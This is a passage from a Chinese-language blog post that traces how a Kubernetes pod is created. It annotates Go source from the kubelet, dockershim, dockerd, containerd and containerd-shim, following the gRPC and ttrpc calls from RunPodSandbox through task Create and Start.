return &#125; // Successfully started the container; clear the entry in the failure klog.V(4).Infof(&quot;Completed init container %q for pod %q&quot;, container.Name, format.Pod(pod))\t&#125;\t// Step 7: start containers in podContainerChanges.ContainersToStart. for _, idx := range podContainerChanges.ContainersToStart &#123; // 就是业务的 container start(&quot;container&quot;, &amp;pod.Spec.Containers[idx]) // start 可以前面看到定义 start := func(typeName string, container *v1.Container) &#125;\treturn&#125; 上面的源码其实已经知道为什么要引入 sandbox container 了。分析一下 createPodSandbox 这个函数是如何实现的。 12345678910111213141516171819// createPodSandbox creates a pod sandbox and returns (podSandBoxID, message, error).func (m *kubeGenericRuntimeManager) createPodSandbox(pod *v1.Pod, attempt uint32) (string, string, error) &#123;\tpodSandboxConfig, err := m.generatePodSandboxConfig(pod, attempt)\tif err != nil &#123; message := fmt.Sprintf(&quot;GeneratePodSandboxConfig for pod %q failed: %v&quot;, format.Pod(pod), err) klog.Error(message) return &quot;&quot;, message, err\t&#125;\t// Create pod logs directory\terr = m.osInterface.MkdirAll(podSandboxConfig.LogDirectory, 0755) // 这个目录就是 kubelet 配置读取下来的\tif err != nil &#123; message := fmt.Sprintf(&quot;Create pod log directory for pod %q failed: %v&quot;, format.Pod(pod), err)... // 省略错误处理\t... // 删除了非主线逻辑\tpodSandBoxID, err := m.runtimeService.RunPodSandbox(podSandboxConfig, runtimeHandler)... // 省略错误处理\treturn podSandBoxID, &quot;&quot;, nil&#125; 这就是看到调用的 func (in instrumentedRuntimeService) RunPodSandboxha 函数基本是透传，存粹是为了记录一下 metric 为监控服务。 1234567891011func (in instrumentedRuntimeService) RunPodSandbox(config *runtimeapi.PodSandboxConfig, runtimeHandler string) (string, error) &#123;\tconst operation = &quot;run_podsandbox&quot;\tstartTime := time.Now()\tdefer recordOperation(operation, startTime)\tdefer metrics.RunPodSandboxDuration.WithLabelValues(runtimeHandler).Observe(metrics.SinceInSeconds(startTime))\tout, err := in.service.RunPodSandbox(config, runtimeHandler)\trecordError(operation, err)\tif err != nil &#123; metrics.RunPodSandboxErrors.WithLabelValues(runtimeHandler).Inc()... 在上面记录完成监控相关过后，下面就是准备调用 grpc 服务了，可以看到调用的是 CRI 的 /runtime.v1alpha2.RuntimeService/RunPodSandbox 接口。 123456789101112131415// RunPodSandbox creates and starts a pod-level sandbox. Runtimes should ensure// the sandbox is in ready state.func (r *RemoteRuntimeService) RunPodSandbox(config *runtimeapi.PodSandboxConfig, runtimeHandler string) (string, error) &#123;\t// Use 2 times longer timeout for sandbox operation (4 mins by default)\t// TODO: Make the pod sandbox timeout configurable.\tctx, cancel := getContextWithTimeout(r.timeout * 2)\tdefer cancel()\tresp, err := r.runtimeClient.RunPodSandbox(ctx, &amp;runtimeapi.RunPodSandboxRequest&#123; Config: config, RuntimeHandler: runtimeHandler,\t&#125;)...\treturn resp.PodSandboxId, nil&#125; 12345678func (c *runtimeServiceClient) RunPodSandbox(ctx context.Context, in *RunPodSandboxRequest, opts ...grpc.CallOption) (*RunPodSandboxResponse, error) &#123;\tout := new(RunPodSandboxResponse)\terr := c.cc.Invoke(ctx, &quot;/runtime.v1alpha2.RuntimeService/RunPodSandbox&quot;, in, out, opts...)\tif err != nil &#123; return nil, err\t&#125;\treturn out, nil&#125; 以上就是 kubeGenericRuntimeManager 所处理的 POD 创建流程中的 sandbox 的部分，对其 sandbox 具体是如何被创建的更多细节就要看 grpc 服务端的实现了。 dockershim前面梳理出来了 kubeGenericRuntimeManager 是如何通过SyncPod实现POD的创建，但是也发现他的实现完全是面向接口的，完全不关心底层是如何实现 cotnainer 的。我们接着上面 client 的相关逻辑走读一下/runtime.v1alpha2.RuntimeService/RunPodSandbox 的服务端代码逻辑。 123456789var _RuntimeService_serviceDesc = grpc.ServiceDesc&#123;\tServiceName: &quot;runtime.v1alpha2.RuntimeService&quot;,\tHandlerType: (*RuntimeServiceServer)(nil),\tMethods: []grpc.MethodDesc&#123;... &#123; MethodName: &quot;RunPodSandbox&quot;, Handler: _RuntimeService_RunPodSandbox_Handler,... 下面是 handler 注册的过程，其实都是机器生成的代码没有啥好看的。 1234567891011121314func _RuntimeService_RunPodSandbox_Handler(srv interface&#123;&#125;, ctx context.Context, dec func(interface&#123;&#125;) error, interceptor grpc.UnaryServerInterceptor) (interface&#123;&#125;, error) &#123;\tin := new(RunPodSandboxRequest)\tif err := dec(in); err != nil &#123; return nil, err\t&#125;\tif interceptor == nil &#123; return srv.(RuntimeServiceServer).RunPodSandbox(ctx, in)\t&#125;\tinfo := &amp;grpc.UnaryServerInfo&#123; Server: srv, FullMethod: &quot;/runtime.v1alpha2.RuntimeService/RunPodSandbox&quot;,\t&#125;\thandler := func(ctx context.Context, req interface&#123;&#125;) (interface&#123;&#125;, error) &#123; return srv.(RuntimeServiceServer).RunPodSandbox(ctx, req.(*RunPodSandboxRequest)) 这里就是 dockershim 实现的 CRI，走读上下文代码知道了 ds.client.StartContainer() 中的 client 是 libdocker 中，也就是调用的 dockerClient。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788// RunPodSandbox creates and starts a pod-level sandbox. Runtimes should ensure// the sandbox is in ready state.// For docker, PodSandbox is implemented by a container holding the network// namespace for the pod.// Note: docker doesn&#x27;t use LogDirectory (yet).func (ds *dockerService) RunPodSandbox(ctx context.Context, r *runtimeapi.RunPodSandboxRequest) (*runtimeapi.RunPodSandboxResponse, error) &#123;\tconfig := r.GetConfig()\t// Step 1: Pull the image for the sandbox.\timage := defaultSandboxImage // 这里就是 Google 的那个 sandbox 的 image\tpodSandboxImage := ds.podSandboxImage\tif len(podSandboxImage) != 0 &#123; image = podSandboxImage\t&#125;\t// NOTE: To use a custom sandbox image in a private repository, users need to configure the nodes with credentials properly.\t// see: http://kubernetes.io/docs/user-guide/images/#configuring-nodes-to-authenticate-to-a-private-repository\t// Only pull sandbox image when it&#x27;s not present - v1.PullIfNotPresent.\tif err := ensureSandboxImageExists(ds.client, image); err != nil &#123; return nil, err\t&#125;\t// Step 2: Create the sandbox container.\tif r.GetRuntimeHandler() != &quot;&quot; &amp;&amp; r.GetRuntimeHandler() != runtimeName &#123; return nil, fmt.Errorf(&quot;RuntimeHandler %q not supported&quot;, r.GetRuntimeHandler())\t&#125;\tcreateConfig, err := ds.makeSandboxDockerConfig(config, image)\tif err != nil &#123; return nil, fmt.Errorf(&quot;failed to make sandbox docker config for pod %q: %v&quot;, config.Metadata.Name, err)\t&#125;\tcreateResp, err := ds.client.CreateContainer(*createConfig) // 这里的创建 sandbox 是备好 container 需要底层资源\tif err != nil &#123; createResp, err = recoverFromCreationConflictIfNeeded(ds.client, *createConfig, err)\t&#125;\tif err != nil || createResp == nil &#123; return nil, fmt.Errorf(&quot;failed to create a sandbox for pod %q: %v&quot;, config.Metadata.Name, err)\t&#125;\tresp := &amp;runtimeapi.RunPodSandboxResponse&#123;PodSandboxId: createResp.ID&#125;\tds.setNetworkReady(createResp.ID, false)\tdefer func(e *error) &#123; // Set networking ready depending on the error return of // the parent function if *e == nil &#123; ds.setNetworkReady(createResp.ID, true) &#125;\t&#125;(&amp;err)\t// Step 3: Create Sandbox Checkpoint.\tif err = ds.checkpointManager.CreateCheckpoint(createResp.ID, constructPodSandboxCheckpoint(config)); err != nil &#123; return nil, err // 目前来看 checkpoint 功能好像并没有大规模使用？不过这个对我们这次看 pod 创建流程无关经验\t&#125;\t// Step 4: Start the sandbox container.\t// Assume kubelet&#x27;s garbage collector would remove the sandbox later, if\t// startContainer failed.\terr = ds.client.StartContainer(createResp.ID) // 前面准备好 container 这里才去启动，具体怎么启动 kubelet 并不关心\tif err != nil &#123; return nil, fmt.Errorf(&quot;failed to start sandbox container for pod %q: %v&quot;, config.Metadata.Name, err)\t&#125;\t// 删除了一下网络和安全相关代码和核心流程无关\t// Step 5: Setup networking for the sandbox.\t// All pod networking is setup by a CNI plugin discovered at startup time.\t// This plugin assigns the pod ip, sets up routes inside the sandbox,\t// creates interfaces etc. In theory, its jurisdiction ends with pod\t// sandbox networking, but it might insert iptables rules or open ports\t// on the host as well, to satisfy parts of the pod spec that aren&#x27;t\t// recognized by the CNI standard yet.\tcID := kubecontainer.BuildContainerID(runtimeName, createResp.ID)\tnetworkOptions := make(map[string]string)\tif dnsConfig := config.GetDnsConfig(); dnsConfig != nil &#123; // Build DNS options. dnsOption, err := json.Marshal(dnsConfig) if err != nil &#123; return nil, fmt.Errorf(&quot;failed to marshal dns config for pod %q: %v&quot;, config.Metadata.Name, err) &#125; networkOptions[&quot;dns&quot;] = string(dnsOption)\t&#125; // CRI 调用 CNI 来设置 POD 的基础网络\terr = ds.network.SetUpPod(config.GetMetadata().Namespace, config.GetMetadata().Name, cID, config.Annotations, networkOptions) // 删除了一部分设置容器网络错误的处理流程和核心流程无关\treturn resp, nil&#125; 走读的 dockershim 的 RunPodSandbox 接口发现，它调用了 docker 的接口 ds.client.CreateContainer(*createConfig) 创建了 cotnainer, 又使用了 ds.client.StartContainer(createResp.ID) 启动刚刚创建的 cotnainer。在往下面实现就需要去走读 dockerd 的代码了。 12345678910111213141516func (ds *dockerService) RunPodSandbox(ctx context.Context, r *runtimeapi.RunPodSandboxRequest) (*runtimeapi.RunPodSandboxResponse, error) &#123;\tconfig := r.GetConfig()...\tcreateConfig, err := ds.makeSandboxDockerConfig(config, image)\tif err != nil &#123; return nil, fmt.Errorf(&quot;failed to make sandbox docker config for pod %q: %v&quot;, config.Metadata.Name, err)\t&#125;\tcreateResp, err := ds.client.CreateContainer(*createConfig) // 这里的创建 sandbox 是备好 container 需要底层资源...\t// Step 4: Start the sandbox container.\t// Assume kubelet&#x27;s garbage collector would remove the sandbox later, if\t// startContainer failed.\terr = ds.client.StartContainer(createResp.ID) // 前面准备好 container 这里才去启动，具体怎么启动 kubelet 并不关心\tif err != nil &#123; return nil, fmt.Errorf(&quot;failed to start sandbox container for pod %q: %v&quot;, config.Metadata.Name, err)\t&#125; 这里主要关注 ds.client.StartContainer()，是因为 ds.client.CreateContainer(*createConfig) 的逻辑比较简单。 1resp, err := cli.post(ctx, &quot;/containers/&quot;+containerID+&quot;/start&quot;, query, nil, nil) 通过对代码的分析发现 StartContainer 最后发出的是 http 请求。 dockerd 接口&#x2F;containers&#x2F;{name:.*}&#x2F;start基于前面的分析我已经知道 kubelet 的 dockershim 其实使用调用的 docker 的 resftul api，根据线上 docker 的版本信息 18.09.9 checkout相对应的代码。可以发现 container 流程相关的逻辑在 docker/api/server/router/container/container.go 的 initRoutes() 中。 1router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/start&quot;, r.postContainersStart), 上面是 handler 主要逻辑很简单，下面就是启动 container 的核心流程了。 1234567891011func (s *containerRouter) postContainersStart(ctx context.Context, w http.ResponseWriter, r *http.Request, vars map[string]string) error &#123;\t// If contentLength is -1, we can assumed chunked encoding\t// or more technically that the length is unknown\t// https://golang.org/src/pkg/net/http/request.go#L139\t// net/http otherwise seems to swallow any headers related to chunked encoding\t// including r.TransferEncoding\t// allow a nil body for backwards compatibility\t// 移除 http 检查相关逻辑，哪些不影响核心\tif err := s.backend.ContainerStart(vars[&quot;name&quot;], hostConfig, checkpoint, checkpointDir); err != nil &#123; // here ... 12345// ContainerStart starts a container.func (daemon *Daemon) ContainerStart(name string, hostConfig *containertypes.HostConfig, checkpoint string, checkpointDir string) error &#123;// 删除大量的保护式编程非核心逻辑代码\treturn daemon.containerStart(container, checkpoint, checkpointDir, true) // here&#125; 跟如这个Start函数发现居然是使用 grpc 去调用/containerd.services.tasks.v1.Tasks/Start的接口。 12345678910111213141516171819202122232425262728293031323334353637383940// containerStart prepares the container to run by setting up everything the// container needs, such as storage and networking, as well as links// between containers. The container is left waiting for a signal to// begin running.func (daemon *Daemon) containerStart(container *container.Container, checkpoint string, checkpointDir string, resetRestartManager bool) (err error) &#123;\tstart := time.Now()\tcontainer.Lock()\tdefer container.Unlock()\t// 删除错误处理与一下防御编程\tif err := daemon.conditionalMountOnStart(container); err != nil &#123; return err\t&#125;\tif err := daemon.initializeNetworking(container); err != nil &#123; return err\t&#125;\tspec, err := daemon.createSpec(container)\tif err != nil &#123; return errdefs.System(err)\t&#125;// 删除一下非核心功能代码\tcreateOptions, err := daemon.getLibcontainerdCreateOptions(container)\tif err != nil &#123; return err\t&#125;\tctx := context.TODO()\terr = daemon.containerd.Create(ctx, container.ID, spec, createOptions) // 这里最终会调用 cotnainerd 的 create\t// 删除错误处理相关代码\t// TODO(mlaventure): we need to specify checkpoint options here\tpid, err := daemon.containerd.Start(context.Background(), container.ID, checkpointDir, // 这里需要跟进一下 container.StreamConfig.Stdin() != nil || container.Config.Tty, container.InitializeStdio) // 忽略错误处理... containerStart 函数准备 containerd 运行的一切需要的东西包括存储和网络。但是实际启动可以发现是调用了daemon.containerd.Create与daemon.containerd.Start接口，细节下面进一步分析。 1234567891011121314151617181920212223242526272829func (c *client) Create(ctx context.Context, id string, ociSpec *specs.Spec, runtimeOptions interface&#123;&#125;) error &#123;\tif ctr := c.getContainer(id); ctr != nil &#123; return errors.WithStack(newConflictError(&quot;id already in use&quot;))\t&#125;\tbdir, err := prepareBundleDir(filepath.Join(c.stateDir, id), ociSpec) // 其实就是准备容器启动目录之类的\tif err != nil &#123; return errdefs.System(errors.Wrap(err, &quot;prepare bundle dir failed&quot;))\t&#125;\tc.logger.WithField(&quot;bundle&quot;, bdir).WithField(&quot;root&quot;, ociSpec.Root.Path).Debug(&quot;bundle dir created&quot;)\tcdCtr, err := c.client.NewContainer(ctx, id, // 核心代码，更多的逻辑需要下面展开 containerd.WithSpec(ociSpec), // TODO(mlaventure): when containerd support lcow, revisit runtime value containerd.WithRuntime(fmt.Sprintf(&quot;io.containerd.runtime.v1.%s&quot;, runtime.GOOS), runtimeOptions))\tif err != nil &#123; return wrapError(err)\t&#125;\tc.Lock()\tc.containers[id] = &amp;container&#123; bundleDir: bdir, ctr: cdCtr,\t&#125;\tc.Unlock()\treturn nil&#125; NewContainer() 就是这一段代码的核心，需要展开说明 1234567891011121314151617181920212223242526// NewContainer will create a new container in container with the provided id// the id must be unique within the namespacefunc (c *Client) NewContainer(ctx context.Context, id string, opts ...NewContainerOpts) (Container, error) &#123; ctx, done, err := c.WithLease(ctx) if err != nil &#123; return nil, err &#125; defer done(ctx) container := containers.Container&#123; ID: id, Runtime: containers.RuntimeInfo&#123; Name: c.runtime, &#125;, &#125; for _, o := range opts &#123; if err := o(ctx, c, &amp;container); err != nil &#123; return nil, err &#125; &#125; r, err := c.ContainerService().Create(ctx, container) // 核心就是 create 了 if err != nil &#123; return nil, err &#125; return containerFromRecord(c, r), nil&#125; 可以看到c.ContainerService().Create(ctx, container)其实调用了 container service，这个个是 docker 层面的抽象，具体实现是 containerd提供的。 1234func (r *remoteContainers) Create(ctx context.Context, container containers.Container) (containers.Container, error) &#123; created, err := r.client.Create(ctx, &amp;containersapi.CreateContainerRequest&#123; Container: containerToProto(&amp;container),... 1234func (c *containersClient) Create(ctx context.Context, in *CreateContainerRequest, opts ...grpc.CallOption) (*CreateContainerResponse, error) &#123;\tout := new(CreateContainerResponse)\terr := grpc.Invoke(ctx, &quot;/containerd.services.containers.v1.Containers/Create&quot;, in, out, c.cc, opts...)... 基于上述client.create其实也可以发现，实质性的工作只有一个就是准备启动需要一些目录结构。这一切都是为了准备调用 /containerd.services.containers.v1.Containers/Create接口。 docker 调用完成 containerd 的 create 下面就要调用 daemon.containerd.Start()。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// Start create and start a task for the specified containerd idfunc (c *client) Start(ctx context.Context, id, checkpointDir string, withStdin bool, attachStdio StdioCallback) (int, error) &#123;\tctr := c.getContainer(id)\tif ctr == nil &#123; return -1, errors.WithStack(newNotFoundError(&quot;no such container&quot;))\t&#125;\tif t := ctr.getTask(); t != nil &#123; return -1, errors.WithStack(newConflictError(&quot;container already started&quot;))\t&#125;\tvar ( cp *types.Descriptor t containerd.Task rio cio.IO err error stdinCloseSync = make(chan struct&#123;&#125;)\t)\t// 忽略 checkpoint 相关代码\tspec, err := ctr.ctr.Spec(ctx)\tif err != nil &#123; return -1, errors.Wrap(err, &quot;failed to retrieve spec&quot;)\t&#125;\tuid, gid := getSpecUser(spec)\tt, err = ctr.ctr.NewTask(ctx, // 这里就是调用 containerd, /containerd.services.tasks.v1.Tasks/Create func(id string) (cio.IO, error) &#123; fifos := newFIFOSet(ctr.bundleDir, InitProcessName, withStdin, spec.Process.Terminal) rio, err = c.createIO(fifos, id, InitProcessName, stdinCloseSync, attachStdio) return rio, err &#125;, func(_ context.Context, _ *containerd.Client, info *containerd.TaskInfo) error &#123; info.Checkpoint = cp info.Options = &amp;runctypes.CreateOptions&#123; IoUid: uint32(uid), IoGid: uint32(gid), NoPivotRoot: os.Getenv(&quot;DOCKER_RAMDISK&quot;) != &quot;&quot;, &#125; return nil &#125;)// 移除错误处理相关代码\tctr.setTask(t)\t// Signal c.createIO that it can call CloseIO\tclose(stdinCloseSync)\tif err := t.Start(ctx); err != nil &#123; // 这个 t 是 task 的缩写，/containerd.services.tasks.v1.Tasks/Start// 移除错误处理相关代码 基于上述代码可以看到，这里还是二次封装了。 ctr.ctr.NewTask() 就是准备好参数准备调用 containerd的/containerd.services.tasks.v1.Tasks/Create接口。 123456789101112131415161718func (c *container) NewTask(ctx context.Context, ioCreate cio.Creator, opts ...NewTaskOpts) (_ Task, err error) &#123; // 删除析构函数和错误处理\tcfg := i.Config()\trequest := &amp;tasks.CreateTaskRequest&#123; ContainerID: c.id, Terminal: cfg.Terminal, Stdin: cfg.Stdin, Stdout: cfg.Stdout, Stderr: cfg.Stderr,\t&#125;\t// 删除部分代码\tresponse, err := c.client.TaskService().Create(ctx, request) // task service create\tif err != nil &#123; return nil, errdefs.FromGRPC(err)\t&#125;\tt.pid = response.Pid\treturn t, nil&#125; 12345678func (c *tasksClient) Create(ctx context.Context, in *CreateTaskRequest, opts ...grpc.CallOption) (*CreateTaskResponse, error) &#123; out := new(CreateTaskResponse) err := grpc.Invoke(ctx, &quot;/containerd.services.tasks.v1.Tasks/Create&quot;, in, out, c.cc, opts...) if err != nil &#123; return nil, err &#125; return out, nil&#125; 而t.Start(ctx)函数的实现更简单，最后调用containerd的/containerd.services.tasks.v1.Tasks/Start接口 12345678func (c *tasksClient) Start(ctx context.Context, in *StartRequest, opts ...grpc.CallOption) (*StartResponse, error) &#123;\tout := new(StartResponse)\terr := grpc.Invoke(ctx, &quot;/containerd.services.tasks.v1.Tasks/Start&quot;, in, out, c.cc, opts...)\tif err != nil &#123; return nil, err\t&#125;\treturn out, nil&#125; 基于以上分析，其实 dockerd 的ContainerStart先后会调用到cotnainerd的/containerd.services.containers.v1.Containers/Create，其次/containerd.services.tasks.v1.Tasks/Create，最后是/containerd.services.tasks.v1.Tasks/Start。 那么下面就去走读一下 containerd的相关实现。 containerd根据线上信息 checkout 出containerd版本为7ad184331fa3e55e52b890ea95e65ba581ae3429的代码进行走读。根据上一篇结束的接口信息，直接搜索相关GRPC接口可以找到实现的 handler。 123456789func _Containers_Create_Handler(srv interface&#123;&#125;, ctx context.Context, dec func(interface&#123;&#125;) error, interceptor ...\tinfo := &amp;grpc.UnaryServerInfo&#123; Server: srv, FullMethod: &quot;/containerd.services.containers.v1.Containers/Create&quot;,\t&#125;\thandler := func(ctx context.Context, req interface&#123;&#125;) (interface&#123;&#125;, error) &#123; return srv.(ContainersServer).Create(ctx, req.(*CreateContainerRequest))... 123456789func _Tasks_Create_Handler(srv interface&#123;&#125;, ctx context.Context, dec func(interface&#123;&#125;) error, interceptor grpc.UnaryServerInterceptor) (interface&#123;&#125;, error) &#123;...\tinfo := &amp;grpc.UnaryServerInfo&#123; Server: srv, FullMethod: &quot;/containerd.services.tasks.v1.Tasks/Create&quot;,\t&#125;\thandler := func(ctx context.Context, req interface&#123;&#125;) (interface&#123;&#125;, error) &#123; return srv.(TasksServer).Create(ctx, req.(*CreateTaskRequest))... 123456789func _Tasks_Start_Handler(srv interface&#123;&#125;, ctx context.Context, dec func(interface&#123;&#125;) error, interceptor grpc.UnaryServerInterceptor) (interface&#123;&#125;, error) &#123;...\tinfo := &amp;grpc.UnaryServerInfo&#123; Server: srv, FullMethod: &quot;/containerd.services.tasks.v1.Tasks/Start&quot;,\t&#125;\thandler := func(ctx context.Context, req interface&#123;&#125;) (interface&#123;&#125;, error) &#123; return srv.(TasksServer).Start(ctx, req.(*StartRequest))... 那么这一篇分别走读一下三个接口是如何实现的。 ContainersServer.Create 方法的实现再来看一下create实现，通过之前 api 配合 IDE 就能直接转跳到下面的代码实现。 12345678func (l *local) Create(ctx context.Context, req *api.CreateContainerRequest, _ ...grpc.CallOption) (*api.CreateContainerResponse, error) &#123;\tvar resp api.CreateContainerResponse\tif err := l.withStoreUpdate(ctx, func(ctx context.Context, store containers.Store) error &#123; container := containerFromProto(&amp;req.Container) created, err := store.Create(ctx, container) // 将 container 的信息写入本地的一个数据库... 通过对上面代码走读分析，发现其实 cotnainerd 的 create 操作仅仅就是写一个数据到 bucket 中去，还有一个 event信息 create container。目前还不明白这个 event 除了使用 ctr events看到还有其他的作用么？ TasksServer.Create 方法的实现containerd 使用 task 来管理 container 的创建和删除，在 containerd 的 readme 文档中也写的比较清楚了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051func (l *local) Create(ctx context.Context, r *api.CreateTaskRequest, _ ...grpc.CallOption) (*api.CreateTaskResponse, error) &#123;\tvar ( checkpointPath string err error\t)\tcontainer, err := l.getContainer(ctx, r.ContainerID) // 前面写 db，这里读 db 获取 cotnainer 的信息。\tif err != nil &#123; return nil, errdefs.ToGRPC(err)\t&#125;\topts := runtime.CreateOpts&#123; Spec: container.Spec, IO: runtime.IO&#123; Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, &#125;, Checkpoint: checkpointPath, Runtime: container.Runtime.Name, RuntimeOptions: container.Runtime.Options, TaskOptions: r.Options,\t&#125;\tfor _, m := range r.Rootfs &#123; opts.Rootfs = append(opts.Rootfs, mount.Mount&#123; Type: m.Type, Source: m.Source, Options: m.Options, &#125;)\t&#125;\truntime, err := l.getRuntime(container.Runtime.Name) // runtime 名字，现在有 v1.linux, v2 两个实现\tif err != nil &#123; return nil, err\t&#125;\tc, err := runtime.Create(ctx, r.ContainerID, opts) // 目前线上使用 v1（目前是通过 containerd-shim 后面的参数判断出来的，v1/v2 参数差别很明显\tif err != nil &#123; return nil, errdefs.ToGRPC(err)\t&#125;\t// TODO: fast path for getting pid on create\tif err := l.monitor.Monitor(c); err != nil &#123; return nil, errors.Wrap(err, &quot;monitor task&quot;)\t&#125;\tstate, err := c.State(ctx)\tif err != nil &#123; log.G(ctx).Error(err)\t&#125;\treturn &amp;api.CreateTaskResponse&#123; ContainerID: r.ContainerID, Pid: state.Pid,\t&#125;, nil&#125; 这里使用 v1 Linux runtime 的create 方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115// Create a new taskfunc (r *Runtime) Create(ctx context.Context, id string, opts runtime.CreateOpts) (_ runtime.Task, err error) &#123;\tnamespace, err := namespaces.NamespaceRequired(ctx) // 这里 ns 是 moby，就是 docker 那个新的名字\tif err != nil &#123; return nil, err\t&#125;\tif err := identifiers.Validate(id); err != nil &#123; return nil, errors.Wrapf(err, &quot;invalid task id&quot;)\t&#125;\tropts, err := r.getRuncOptions(ctx, id)\tif err != nil &#123; return nil, err\t&#125;\tbundle, err := newBundle(id, // newBundle creates a new bundle on disk at the provided path for the given id filepath.Join(r.state, namespace), filepath.Join(r.root, namespace), opts.Spec.Value)\tif err != nil &#123; return nil, err\t&#125;\tdefer func() &#123; if err != nil &#123; bundle.Delete() &#125;\t&#125;() // ShimLocal is a ShimOpt for using an in process shim implementation\tshimopt := ShimLocal(r.config, r.events)\tif !r.config.NoShim &#123; // 在正常的逻辑会命中这里，我们使用了 shim var cgroup string if opts.TaskOptions != nil &#123; v, err := typeurl.UnmarshalAny(opts.TaskOptions) if err != nil &#123; return nil, err &#125; cgroup = v.(*runctypes.CreateOptions).ShimCgroup &#125; exitHandler := func() &#123; log.G(ctx).WithField(&quot;id&quot;, id).Info(&quot;shim reaped&quot;) t, err := r.tasks.Get(ctx, id) if err != nil &#123; // Task was never started or was already successfully deleted return &#125; lc := t.(*Task) log.G(ctx).WithFields(logrus.Fields&#123; &quot;id&quot;: id, &quot;namespace&quot;: namespace, &#125;).Warn(&quot;cleaning up after killed shim&quot;) if err = r.cleanupAfterDeadShim(context.Background(), bundle, namespace, id, lc.pid); err != nil &#123; log.G(ctx).WithError(err).WithFields(logrus.Fields&#123; &quot;id&quot;: id, &quot;namespace&quot;: namespace, &#125;).Warn(&quot;failed to clean up after killed shim&quot;) &#125; &#125; shimopt = ShimRemote(r.config, r.address, cgroup, exitHandler) // 这里目前只是构建好了 shimopt 这个函数，目前还没有真的调用\t&#125;\t// shimopt 这个函数准备好了，这里才开始调用启动 shim 并返回 shim client\ts, err := bundle.NewShimClient(ctx, namespace, shimopt, ropts) if err != nil &#123; return nil, err\t&#125;\tdefer func() &#123; if err != nil &#123; if kerr := s.KillShim(ctx); kerr != nil &#123; log.G(ctx).WithError(err).Error(&quot;failed to kill shim&quot;) &#125; &#125;\t&#125;()\trt := r.config.Runtime\tif ropts != nil &amp;&amp; ropts.Runtime != &quot;&quot; &#123; rt = ropts.Runtime\t&#125;\tsopts := &amp;shim.CreateTaskRequest&#123; ID: id, Bundle: bundle.path, Runtime: rt, Stdin: opts.IO.Stdin, Stdout: opts.IO.Stdout, Stderr: opts.IO.Stderr, Terminal: opts.IO.Terminal, Checkpoint: opts.Checkpoint, Options: opts.TaskOptions,\t&#125;\tfor _, m := range opts.Rootfs &#123; sopts.Rootfs = append(sopts.Rootfs, &amp;types.Mount&#123; Type: m.Type, Source: m.Source, Options: m.Options, &#125;)\t&#125;\t// Create a new initial process and container with the underlying OCI runtime // cr, err := s.Create(ctx, sopts) // 也就是 shim 的 create 方法，按住不表到讲 containerd-shim 再说。\tif err != nil &#123; return nil, errdefs.FromGRPC(err)\t&#125;\tt, err := newTask(id, namespace, int(cr.Pid), s, r.events, r.tasks, bundle)\tif err != nil &#123; return nil, err\t&#125;\tif err := r.tasks.Add(ctx, t); err != nil &#123; return nil, err\t&#125;\t// ... 移除一部分 event 相关逻辑\treturn t, nil&#125; 基于以上其实就已经准备好了 task 并启动，在 cotnainerd 中调用使用命令行调用 containerd-shim。其余的逻辑要到 cotnainerd-shim 中去探索了。 TasksServer.Start 方法的实现create 操作看完了看一下 start 方法是如何实现的，搜索其对应的接口 /containerd.services.tasks.v1.Tasks/Start 12func (s *service) Start(ctx context.Context, r *api.StartRequest) (*api.StartResponse, error) &#123;\treturn s.local.Start(ctx, r) 依然是 v1.linux 实现 12345678910111213141516171819202122func (l *local) Start(ctx context.Context, r *api.StartRequest, _ ...grpc.CallOption) (*api.StartResponse, error) &#123;\tt, err := l.getTask(ctx, r.ContainerID) // 这里就是从 bucket db 中获取数据\tif err != nil &#123; return nil, err\t&#125;\tp := runtime.Process(t)\tif r.ExecID != &quot;&quot; &#123; if p, err = t.Process(ctx, r.ExecID); err != nil &#123; return nil, errdefs.ToGRPC(err) &#125;\t&#125;\tif err := p.Start(ctx); err != nil &#123; // Start the container&#x27;s user defined process return nil, errdefs.ToGRPC(err)\t&#125;\tstate, err := p.State(ctx)\tif err != nil &#123; return nil, errdefs.ToGRPC(err) // ToGRPC\t&#125;\treturn &amp;api.StartResponse&#123; Pid: state.Pid,\t&#125;, nil... 12345678// Start the taskfunc (t *Task) Start(ctx context.Context) error &#123;\tt.mu.Lock()\thasCgroup := t.cg != nil\tt.mu.Unlock()\tr, err := t.shim.Start(ctx, &amp;shim.StartRequest&#123; // 调用 shim 的 start ID: t.id,... 基于以上两个接口其实发现更多工作 containerd 放到了 conteinrd-shim 中完成了。 containerd-shim 的如何工作初看 containerd-shim 的实现模型也不是很复杂，主函数中调用一个 rpc 服务常驻后台，对外提供服务。 1234func main() &#123;...\tif err := executeShim(); err != nil &#123; 1234567891011121314151617181920212223242526272829func executeShim() error &#123;....\t&#125;\tserver, err := newServer()\tif err != nil &#123; return errors.Wrap(err, &quot;failed creating server&quot;)\t&#125;\tsv, err := shim.NewService( shim.Config&#123; Path: path, Namespace: namespaceFlag, WorkDir: workdirFlag, Criu: criuFlag, SystemdCgroup: systemdCgroupFlag, RuntimeRoot: runtimeRootFlag, &#125;, &amp;remoteEventsPublisher&#123;address: addressFlag&#125;,\t)\tif err != nil &#123; return err\t&#125;\tlogrus.Debug(&quot;registering ttrpc server&quot;)\tshimapi.RegisterShimService(server, sv) // ttrpc socket := socketFlag\tif err := serve(context.Background(), server, socket); err != nil &#123; return err\t&#125;.... 唯一值得一提的就是ttrpc是低内存下面的 rpc 协议，基于 grpc 的低内存版本。 1234567891011121314151617func RegisterShimService(srv *ttrpc.Server, svc ShimService) &#123;\tsrv.Register(&quot;containerd.runtime.linux.shim.v1.Shim&quot;, map[string]ttrpc.Method&#123;... &quot;Create&quot;: func(ctx context.Context, unmarshal func(interface&#123;&#125;) error) (interface&#123;&#125;, error) &#123; var req CreateTaskRequest if err := unmarshal(&amp;req); err != nil &#123; return nil, err &#125; return svc.Create(ctx, &amp;req) &#125;, &quot;Start&quot;: func(ctx context.Context, unmarshal func(interface&#123;&#125;) error) (interface&#123;&#125;, error) &#123; var req StartRequest if err := unmarshal(&amp;req); err != nil &#123; return nil, err &#125; return svc.Start(ctx, &amp;req) &#125;, 这次只关心 shim 的 Create 与 Start 实现。 contained-shim create这个就是containerd的s.Create(ctx, 